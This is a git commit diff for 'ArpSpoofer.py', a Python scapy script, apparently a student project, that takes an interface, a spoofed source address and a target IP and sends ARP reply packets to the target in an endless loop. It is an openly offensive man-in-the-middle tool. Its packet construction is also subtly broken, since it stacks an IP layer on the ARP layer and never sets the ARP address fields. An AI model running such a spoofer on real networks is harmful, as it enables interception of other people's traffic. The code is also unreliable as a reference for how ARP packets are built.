a158b43b55505cdd4edcdc20d2692799ea6fa0fd
Genghis Khan <gkomet@g.jct.ac.il>
2020-03-12 21:03:39 +0200

    Added fields

--- ArpSpoofer.py
+++ ArpSpoofer.py
@@ -1,20 +1,37 @@
 import argparse
-import scapy
+from scapy.all import *
+
+args = None
 
 
 def parse_command():
+    """
+
+    :return: Parse of the arguments
+    """
     ap = argparse.ArgumentParser(description="Spoof ARP tables")
-    ap.add_argument('-i', '--iface', nargs=1, help='Interface you wish to use')
-    ap.add_argument('-s', '--src', nargs=1, help='The address you want for the attacker')
-    ap.add_argument('-d', '--delay', nargs=1, type=int, default=0, help='Delay (in seconds) between messages')
+    ap.add_argument('-i', '--iface', help='Interface you wish to use')
+    ap.add_argument('-s', '--src', help='The address you want for the attacker')
+    ap.add_argument('-d', '--delay', type=float, default=0, help='Delay (in seconds) between messages')
     ap.add_argument('-gw', action='store_true', default=False, help='should GW be attacked as well')
-    ap.add_argument('-t', '--target', nargs=1, help='IP of target')
+    ap.add_argument('-t', '--target', required=True, help='IP of target')
     return ap.parse_args()
 
 
 def main():
-    pass
-
+    src_address = None  # src_address for the ARP response. Defined here so it can be assigned to within a condition
+    if args.src is None:  # If no src argument was supplied
+        src_address = IP().src  # Get the devices IP address
+    else:
+        src_address = args.src  # Get the IP address supplied as command-line argument
+    if args.gw:
+        pass
+    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2)/IP(src=src_address, dst=args.target)
+    pkt.show()
+    while True:
+        sendp(pkt, iface=args.iface)
+        time.sleep(args.delay)
+        
 
 if __name__ == '__main__':
     args = parse_command()
